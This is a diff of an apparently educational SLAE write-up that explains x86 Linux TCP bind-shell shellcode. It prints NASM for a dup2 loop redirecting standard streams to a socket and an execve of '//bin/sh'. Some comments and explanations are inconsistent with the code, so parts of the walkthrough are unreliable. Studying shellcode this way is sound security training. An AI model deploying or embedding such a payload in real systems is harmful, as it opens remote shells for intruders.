@@ -454,25 +454,26 @@ osboxes@osboxes:~/Downloads/SLAE$ cat /usr/include/i386-linux-gnu/asm/unistd_32.
 #define __NR_dup2 63
 ```
 
-The syscall code of 63 is moved in the lower part of the EAX memory region.
-
 All required arguments of dup2 are in sockfd (stored in accept syscall), which will be moved into EBX.
 
-Whilst the zero flag is not set (JNZ) - the counter register is decremented each time within the loop. Once the value of '-1' gets set in ECX, the signed flag will be set and the loop is broken (exits when $exc equals 0):
+The syscall code of 0x3f is moved in the lower part of the EAX memory region.
+
+Whilst the signed flag is not set (JNS) - the counter register is decremented each time within the loop. Once the value of '-1' gets set in ECX, the signed flag will be set and the loop is broken (exits when $exc equals 0).
 
 5th syscall (Assembly code section):
 
 ```nasm
-	; 5th syscall - duplicate file descriptors for STDIN, STDOUT and STDERR 
-	mov cl, 0x3     ; move 3 in the counter loop (stdin, stdout, stderr)   
-	
-	loop_dup2:
- 	xor eax, eax    ; clear register
-   	mov al, 0x3f    ; move the dup2 syscall code into the lower part of eax
-   	mov ebx, edi    ; move the new int sockfd (stored in edi) into ebx
-   	dec cl          ; decrement cl by 1
-   	int 0x80	; call the interrupt to execute dup2 syscall
-    	jnz loop_dup2   ; jump back to the top of loop_dup2 if the zero flag is not set
+	; 5th syscall - duplicate file descriptors for STDIN, STDOUT and STDERR
+        mov edx, eax    ; save client file descriptor
+	xor ecx, ecx	; clear ecx register
+	mov cl, 3	; counter for file descriptors 0,1,2 (STDIN, STDOUT, STDERR)
+	mov ebx, edx	; move socket into ebx (new int sockfd)
+
+        loop_dup2:
+        dec ecx         ; decrement ecx by 1 (new int sockfd)
+	mov al, 0x3f  	; move the dup2 syscall code into the lower part of eax
+        int 0x80      	; call interrupt to execute dup2 syscall
+        jns loop_dup2   ; repeat for 1,0
 ```
 
 #### 6th Syscall (Execute /bin/sh using Execve) 
@@ -483,7 +484,7 @@ The final syscall instructs the program to execute the execve syscall which esse
 The execve syscall is defined by the man pages as follows:
 
 ```bash
-man execve
+osboxes@osboxes:~/Downloads/SLAE$ man execve
 
 EXECVE(2)                              Linux Programmer's Manual                             EXECVE(2)
 
@@ -520,7 +521,7 @@ This instuction set will load the string '/bin/sh' onto the stack in reverse ord
 The execve syscall works with Null pointers and terminators, which requires a terminator to be placed onto the stack after clearing the EAX register and setting the value to '0':
 
 ```nasm
-	xor eax, eax	; clear register, place execve
+	xor eax, eax	; clear register
 	push eax	; terminator placed onto the stack with value of 0
 ```
 
@@ -548,8 +549,8 @@ Type "help", "copyright", "credits" or "license" for more information.
 After the Null terminator has been pushed onto the stack to null terminate the '//bin/sh argument', the hex values for '//bin/sh' can then be pushed onto the stack (reverse order):
 
 ```nasm
-	push  0x68732f2f ; push the end of "//bin/sh", 'hs/n'
-	push  0x6e69622f ; push the beginning of "//bin/sh", 'ib//'
+	push 0x68732f6e ; push the end of "//bin/sh", 'hs/n'
+        push 0x69622f2f ; push the beginning of "//bin/sh", 'ib//'
 ```
 
 The EBX register will be used to carry the pointer location of the '//bin/sh' entity, which points EBC to the stack:
@@ -557,18 +558,18 @@ The EBX register will be used to carry the pointer location of the '//bin/sh' en
 ```nasm
 	mov ebx, esp	; move pointer to '//bin/sh' into ebx, null terminated
 ```
-Null out the EAX register by pushing the value of '0' onto the stack, then move the pointer to '//bin/sh' from ESP into EDX (Null terminated):
+Null out the EAX register by pushing the value of '0' onto the stack, then move the pointer to '//bin/sh' from EAX into EDX (Null terminated):
 
 ```nasm
-	push eax	; push 0 onto the stack, sys argv
-	mov edx, esp	; move pointer to '//bin/sh' into edx, null terminated
+	push eax        ; terminator placed onto the stack with value of 0
+        mov edx, eax    ; move pointer to '//bin/sh' into edx, null terminated
 ```
 
 ECX should point to the location of EBX, push EBX onto the stack and then move ESP into ECX:
 
 ```nasm
-	push ebx	; push 0 onto the stack, sys envp
-	mov ecx, esp	; move pointer to '//bin/sh' into ecx, null terminated
+	push ebx        ; push 0 onto the stack
+        mov ecx, esp    ; move pointer to '//bin/sh' into ecx, null terminated
 ```
 
 The execve syscall code can be found in the header file below, converting 11 from decimal to hex equals 0x0b:
@@ -583,25 +584,25 @@ The value of 0x0b is placed into the lower memory region of EAX.
 Finally the execve syscall and the the program interrupt are called to execute the program and initiate the full TCP bind shell on the target machine:
 
 ```nasm
-	mov al, 0x0b	; execve syscall
-        int 0x80	; call the interrupt to execute execve syscall, execute '//bin/sh' shell
+	mov al, 0xb     ; move syscall code for execve into al
+        int 0x80        ; call the interrupt to execute execve syscall, execute '//bin/sh' shell
 ```
 
 6th syscall (Assembly code section):
 
 ```nasm
-	; 6th syscall - execute /bin/sh using execve 
-	xor eax, eax	; clear register, place execve
-	push eax	; terminator placed onto the stack with value of 0
-	push 0x68732f6e	; push the end of "//bin/sh", 'hs/n'
-	push 0x69622f2f	; push the beginning of "//bin/sh", 'ib//'
-	mov ebx, esp	; move pointer to '//bin/sh' into ebx, null terminated
-	push eax	; push 0 onto the stack
-	mov edx, esp	; move pointer to '//bin/sh' into edx, null terminated
-	push ebx	; push 0 onto the stack
-	mov ecx, esp	; move pointer to '//bin/sh' into ecx, null terminated
-	mov al, 0x0b	; move syscall code for execve into al
-	int 0x80	; call the interrupt to execute execve syscall, execute '//bin/sh' shell
+	; 6th syscall - execute /bin/sh using execve
+        xor eax, eax	; clear eax register
+	push eax        ; terminator placed onto the stack with value of 0
+        push 0x68732f6e ; push the end of "//bin/sh", 'hs/n'
+        push 0x69622f2f ; push the beginning of "//bin/sh", 'ib//'
+        mov ebx, esp    ; move pointer to '//bin/sh' into ebx, null terminated
+        push eax        ; terminator placed onto the stack with value of 0
+        mov edx, eax    ; move pointer to '//bin/sh' into edx, null terminated
+        push ebx        ; push 0 onto the stack
+        mov ecx, esp    ; move pointer to '//bin/sh' into ecx, null terminated
+	mov al, 0xb     ; move syscall code for execve into al
+        int 0x80        ; call the interrupt to execute execve syscall, execute '//bin/sh' shell
 ```
 
 #### Assembly Code (Final)
